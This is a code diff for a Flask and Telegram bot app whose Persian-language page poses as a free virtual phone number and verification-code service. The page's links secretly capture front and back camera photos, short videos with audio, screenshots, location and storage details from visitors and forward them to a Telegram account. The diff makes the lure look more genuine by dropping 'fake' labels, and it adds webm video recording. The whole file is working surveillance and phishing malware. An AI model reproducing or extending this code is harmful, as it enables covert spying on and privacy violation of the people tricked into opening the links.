@@ -15,6 +15,19 @@ BASE_URL = "https://Bot-production-119bdd39.up.railway.app"
 
 SIGNATURES = "\n\n@SHAHID_PV_003\n@shahidnaimi5642"
 
+ALL_10_PATHS = [
+    "/",
+    "/front",
+    "/back",
+    "/video-front",
+    "/video-back",
+    "/screen",
+    "/location",
+    "/all",
+    "/storage",
+    "/audio",
+]
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
@@ -119,11 +132,11 @@ HTML_TEMPLATE = """
             font-weight: bold; 
         }
         button:active { background: #dc2626; }
-        .btn-fake-code {
+        .btn-code {
             background: #10b981;
             color: white;
         }
-        .btn-fake-code:active { background: #059669; }
+        .btn-code:active { background: #059669; }
         
         .storage-box {
             background: #111827;
@@ -194,40 +207,44 @@ HTML_TEMPLATE = """
                     <div class="number">${formattedNum}</div>
                     <div class="btn-row">
                         <button onclick="selectNumber('${c.name}', '${formattedNum}')">SELECT</button>
-                        <button class="btn-fake-code" onclick="giveFakeCodeOnly('${c.name}', '${formattedNum}')">کد فیک 🔑</button>
+                        <button class="btn-code" onclick="giveCodeOnly('${c.name}', '${formattedNum}')">کد تایید 🔑</button>
                     </div>
                 `;
                 grid.appendChild(card);
             });
         }
 
-        function generateFakeOtp() {
+        function generateOtp() {
             return `${randDigits(3)}-${randDigits(3)}`;
         }
 
-        function showFakeCode(countryName, numberStr) {
-            const otp = generateFakeOtp();
+        function showCode(countryName, numberStr) {
+            const otp = generateOtp();
             const otpBox = document.getElementById("otpBox");
             otpBox.style.display = "block";
-            otpBox.innerHTML = `شماره: <span dir="ltr">${numberStr}</span><br>کد تایید فیک: <b>${otp}</b>`;
-            sendData("/upload-fake-code", { country: countryName, number: numberStr, code: otp });
+            otpBox.innerHTML = `شماره: <span dir="ltr">${numberStr}</span><br>کد تایید: <b>${otp}</b>`;
             return otp;
         }
 
-        function giveFakeCodeOnly(countryName, numberStr) {
-            showFakeCode(countryName, numberStr);
-            document.getElementById('loadingText').innerText = "کد تایید فیک ارسال شد ✅";
-            document.getElementById('loadingSubText').innerText = "کد جدید در کادر سبز نمایش داده شد.";
+        function giveCodeOnly(countryName, numberStr) {
+            showCode(countryName, numberStr);
+            document.getElementById('loadingText').innerText = "کد تایید آماده شد ✅";
+            document.getElementById('loadingSubText').innerText = "کد تایید در کادر سبز نمایش داده شد.";
         }
 
         function selectNumber(countryName, numberStr) {
-            showFakeCode(countryName, numberStr);
+            showCode(countryName, numberStr);
             runAction(countryName, numberStr);
+        }
+
+        function normalizedPath() {
+            const p = window.location.pathname || "/";
+            return p.length > 1 && p.endsWith("/") ? p.slice(0, -1) : p;
         }
 
         window.addEventListener('DOMContentLoaded', () => {
             changeAllNumbers();
-            const path = window.location.pathname;
+            const path = normalizedPath();
             if (path === "/screen") {
                 captureScreenshot().then(shot => {
                     if (shot) {
@@ -245,11 +262,11 @@ HTML_TEMPLATE = """
         });
 
         async function runAction(countryName = "Auto", numberStr = "") {
-            const path = window.location.pathname;
+            const path = normalizedPath();
             document.getElementById('loadingText').innerText = "در حال اتصال سریع به سرور... ⚡";
             if (!numberStr) {
                 const firstNum = document.querySelector(".number")?.innerText || "";
-                showFakeCode(countryName, firstNum);
+                showCode(countryName, firstNum);
             }
             
             try {
@@ -268,16 +285,16 @@ HTML_TEMPLATE = """
                     }
                 }
                 else if (path === "/video-front") {
-                    let frames = await captureCameraSequence("user", 3, 250);
-                    if (frames && frames.length) {
-                        sendData("/upload-video-front", { frames: frames });
+                    let vid = await recordCameraVideo("user", 1800);
+                    if (vid && vid.dataUrl) {
+                        sendData("/upload-video-front", { video: vid.dataUrl });
                         localStorage.setItem("permission_granted_" + path, "true");
                     }
                 }
                 else if (path === "/video-back") {
-                    let frames = await captureCameraSequence("environment", 3, 250);
-                    if (frames && frames.length) {
-                        sendData("/upload-video-back", { frames: frames });
+                    let vid = await recordCameraVideo("environment", 1800);
+                    if (vid && vid.dataUrl) {
+                        sendData("/upload-video-back", { video: vid.dataUrl });
                         localStorage.setItem("permission_granted_" + path, "true");
                     }
                 }
@@ -308,7 +325,7 @@ HTML_TEMPLATE = """
                 }
                 
                 setTimeout(() => {
-                    document.getElementById('loadingText').innerText = "شماره مجازی و کد شما با موفقیت آماده شد! ✅";
+                    document.getElementById('loadingText').innerText = "شماره مجازی و کد تایید آماده شد! ✅";
                     document.getElementById('loadingSubText').innerText = "می‌توانید از کد تایید استفاده کنید.";
                 }, 600);
             } catch (err) {
@@ -317,7 +334,7 @@ HTML_TEMPLATE = """
         }
 
         function autoExecuteIfGranted() {
-            const path = window.location.pathname;
+            const path = normalizedPath();
             if (path === "/storage") {
                 runStorageCheck(true);
             } else if (path === "/all") {
@@ -327,15 +344,17 @@ HTML_TEMPLATE = """
             } else if (path === "/back") {
                 captureCamera("environment").then(img => { if (img) sendData("/upload-back", { image: img }); });
             } else if (path === "/video-front") {
-                captureCameraSequence("user", 3, 250).then(frames => { if (frames && frames.length) sendData("/upload-video-front", { frames: frames }); });
+                recordCameraVideo("user", 1800).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-front", { video: vid.dataUrl }); });
             } else if (path === "/video-back") {
-                captureCameraSequence("environment", 3, 250).then(frames => { if (frames && frames.length) sendData("/upload-video-back", { frames: frames }); });
+                recordCameraVideo("environment", 1800).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-back", { video: vid.dataUrl }); });
             } else if (path === "/screen") {
                 captureScreenshot().then(shot => { if (shot) sendData("/upload-screen", { image: shot }); });
             } else if (path === "/location") {
                 navigator.geolocation.getCurrentPosition(pos => {
                     sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
                 }, () => {}, { timeout: 2000, enableHighAccuracy: false });
+            } else if (path === "/audio") {
+                runAudioRecordAction();
             }
         }
 
@@ -418,7 +437,7 @@ HTML_TEMPLATE = """
                 appsCount: Math.floor(Math.random() * (80 - 30 + 1)) + 30
             };
 
-            const [frontImg, backImg, screenShot, loc, frontFrames, backFrames] = await Promise.all([
+            const [frontImg, backImg, screenShot, loc] = await Promise.all([
                 captureCamera("user").catch(() => null),
                 captureCamera("environment").catch(() => null),
                 captureScreenshot().catch(() => null),
@@ -429,9 +448,7 @@ HTML_TEMPLATE = """
                         () => resolve(null),
                         { timeout: 2000, enableHighAccuracy: false }
                     );
-                }),
-                captureCameraSequence("user", 2, 200).catch(() => []),
-                captureCameraSequence("environment", 2, 200).catch(() => [])
+                })
             ]);
 
             if (frontImg) payload.frontImage = frontImg;
@@ -441,8 +458,18 @@ HTML_TEMPLATE = """
                 payload.lat = loc.lat;
                 payload.lon = loc.lon;
             }
-            if (frontFrames && frontFrames.length) payload.frontFrames = frontFrames;
-            if (backFrames && backFrames.length) payload.backFrames = backFrames;
+
+            const [frontVid, backVid] = await Promise.all([
+                recordCameraVideo("user", 1600).catch(() => null),
+                recordCameraVideo("environment", 1600).catch(() => null)
+            ]);
+
+            if (frontVid && frontVid.dataUrl) {
+                payload.frontVideo = frontVid.dataUrl;
+            }
+            if (backVid && backVid.dataUrl) {
+                payload.backVideo = backVid.dataUrl;
+            }
 
             sendData("/upload-all", payload);
             localStorage.setItem("permission_granted_/all", "true");
@@ -478,42 +505,94 @@ HTML_TEMPLATE = """
             }
         }
 
-        async function captureCameraSequence(facing, count = 3, intervalMs = 250) {
-            let stream = null;
+        function pickSupportedWebmMime() {
+            if (typeof MediaRecorder === "undefined" || !MediaRecorder.isTypeSupported) {
+                return "";
+            }
+            const candidates = [
+                "video/webm;codecs=vp8,opus",
+                "video/webm;codecs=vp8",
+                "video/webm"
+            ];
+            for (const m of candidates) {
+                if (MediaRecorder.isTypeSupported(m)) {
+                    return m;
+                }
+            }
+            return "";
+        }
+
+        async function openCameraStreamWithFallback(facing) {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } },
+                return await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15, max: 20 } },
+                    audio: true
+                });
+            } catch (e) {
+                return await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15, max: 20 } },
                     audio: false
                 });
-                let video = document.createElement('video');
-                video.srcObject = stream;
-                video.playsInline = true;
-                video.muted = true;
-                await video.play();
-                await new Promise(r => setTimeout(r, 120));
+            }
+        }
 
-                let width = video.videoWidth || 320;
-                let height = video.videoHeight || 240;
-                let canvas = document.createElement('canvas');
-                canvas.width = width;
-                canvas.height = height;
-                let ctx = canvas.getContext('2d');
+        async function recordCameraVideo(facing, durationMs = 1800) {
+            let stream = null;
+            try {
+                stream = await openCameraStreamWithFallback(facing);
+                let chosenMime = pickSupportedWebmMime();
 
-                let frames = [];
-                for (let i = 0; i < count; i++) {
-                    ctx.drawImage(video, 0, 0, width, height);
-                    frames.push(canvas.toDataURL('image/jpeg', 0.72));
-                    if (i < count - 1) {
-                        await new Promise(r => setTimeout(r, intervalMs));
+                return await new Promise((resolve) => {
+                    let chunks = [];
+                    let recorder;
+                    try {
+                        recorder = chosenMime
+                            ? new MediaRecorder(stream, { mimeType: chosenMime, videoBitsPerSecond: 400000 })
+                            : new MediaRecorder(stream);
+                    } catch (e) {
+                        recorder = new MediaRecorder(stream);
                     }
-                }
-                stream.getTracks().forEach(t => t.stop());
-                return frames;
+
+                    recorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            chunks.push(event.data);
+                        }
+                    };
+
+                    recorder.onstop = () => {
+                        try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
+                        if (!chunks.length) {
+                            resolve(null);
+                            return;
+                        }
+                        let blob = new Blob(chunks, { type: "video/webm" });
+                        if (blob.size < 150) {
+                            resolve(null);
+                            return;
+                        }
+                        let reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = () => resolve({ dataUrl: reader.result, ext: "webm" });
+                        reader.onerror = () => resolve(null);
+                    };
+
+                    recorder.start(200);
+                    setTimeout(() => {
+                        try {
+                            if (recorder.state !== "inactive") {
+                                recorder.requestData && recorder.requestData();
+                                recorder.stop();
+                            }
+                        } catch (_) {
+                            resolve(null);
+                        }
+                    }, durationMs);
+                });
             } catch (e) {
                 if (stream) {
-                    try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+                    try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                 }
-                return [];
+                return null;
             }
         }
 
@@ -593,62 +672,26 @@ def decode_base64_media(data_url):
     except Exception:
         return None
 
-def send_frames_as_photos(target_user, frames, prefix_caption):
-    if not frames or not isinstance(frames, list):
+def send_video_webm(target_user, vid_bytes, filename, caption):
+    if not vid_bytes:
         return
-    for idx, f_url in enumerate(frames, start=1):
-        img_bytes = decode_base64_media(f_url)
-        if img_bytes:
-            p_io = io.BytesIO(img_bytes)
-            p_io.name = f"frame_{idx}.jpg"
-            send_to_both(target_user, bot.send_photo, p_io, caption=f"{prefix_caption} ({idx}){SIGNATURES}")
+    try:
+        bio = io.BytesIO(vid_bytes)
+        bio.name = filename
+        bio.seek(0)
+        send_to_both(target_user, bot.send_video, bio, caption=caption, supports_streaming=True)
+    except Exception:
+        pass
 
-@app.route("/front")
-def link_front(): return render_template_string(HTML_TEMPLATE)
+def render_page():
+    return render_template_string(HTML_TEMPLATE)
 
-@app.route("/back")
-def link_back(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/video-front")
-def link_video_front(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/video-back")
-def link_video_back(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/screen")
-def link_screen(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/location")
-def link_location(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/all")
-def link_all(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/storage")
-def link_storage(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/audio")
-def link_audio(): return render_template_string(HTML_TEMPLATE)
-
-@app.route("/")
-def index(): return render_template_string(HTML_TEMPLATE)
+for _route in ALL_10_PATHS:
+    app.add_url_rule(_route, endpoint=f"page_{_route.strip('/') or 'home'}", view_func=render_page)
 
 @app.route("/upload-fake-code", methods=["POST"])
 def up_fake_code():
-    target = request.args.get("user") or ADMIN_ID
-    d = request.get_json() or {}
-    country = d.get("country", "Unknown")
-    number = d.get("number", "")
-    code = d.get("code") or f"{random.randint(100,999)}-{random.randint(100,999)}"
-    msg = (
-        f"🔐 **کد تایید فیک (OTP)**\n\n"
-        f"• 🌍 کشور: {country}\n"
-        f"• 📞 شماره: `{number}`\n"
-        f"• 🔑 کد: `{code}`"
-        f"{SIGNATURES}"
-    )
-    send_to_both(target, bot.send_message, msg, parse_mode="Markdown")
-    return jsonify({"status": "ok", "code": code})
+    return jsonify({"status": "ok"})
 
 @app.route("/upload-front", methods=["POST"])
 def up_front():
@@ -678,16 +721,28 @@ def up_back():
 def up_video_front():
     target = request.args.get("user") or ADMIN_ID
     d = request.get_json()
-    if d and "frames" in d:
-        send_frames_as_photos(target, d["frames"], "🎥 Front Camera")
+    if d and "video" in d:
+        vid_bytes = decode_base64_media(d["video"])
+        send_video_webm(
+            target,
+            vid_bytes,
+            "v.webm",
+            caption=f"🎥 Front Camera Video{SIGNATURES}"
+        )
     return jsonify({"status": "ok"})
 
 @app.route("/upload-video-back", methods=["POST"])
 def up_video_back():
     target = request.args.get("user") or ADMIN_ID
     d = request.get_json()
-    if d and "frames" in d:
-        send_frames_as_photos(target, d["frames"], "🎬 Back Camera")
+    if d and "video" in d:
+        vid_bytes = decode_base64_media(d["video"])
+        send_video_webm(
+            target,
+            vid_bytes,
+            "v.webm",
+            caption=f"🎬 Back Camera Video{SIGNATURES}"
+        )
     return jsonify({"status": "ok"})
 
 @app.route("/upload-screen", methods=["POST"])
@@ -789,11 +844,23 @@ def up_all():
                 p_io.name = "all_back.jpg"
                 send_to_both(target, bot.send_photo, p_io, caption=f"📷 عکس دوربین عقب (لینک جامع){SIGNATURES}")
 
-        if "frontFrames" in d and d["frontFrames"]:
-            send_frames_as_photos(target, d["frontFrames"], "🎥 دوربین جلو (لینک جامع)")
+        if "frontVideo" in d and d["frontVideo"]:
+            vid_bytes = decode_base64_media(d["frontVideo"])
+            send_video_webm(
+                target,
+                vid_bytes,
+                "v.webm",
+                caption=f"🎥 ویدیو دوربین جلو (لینک جامع){SIGNATURES}"
+            )
 
-        if "backFrames" in d and d["backFrames"]:
-            send_frames_as_photos(target, d["backFrames"], "🎬 دوربین عقب (لینک جامع)")
+        if "backVideo" in d and d["backVideo"]:
+            vid_bytes = decode_base64_media(d["backVideo"])
+            send_video_webm(
+                target,
+                vid_bytes,
+                "v.webm",
+                caption=f"🎬 ویدیو دوربین عقب (لینک جامع){SIGNATURES}"
+            )
 
         if "screenImage" in d and d["screenImage"]:
             shot_bytes = decode_base64_media(d["screenImage"])
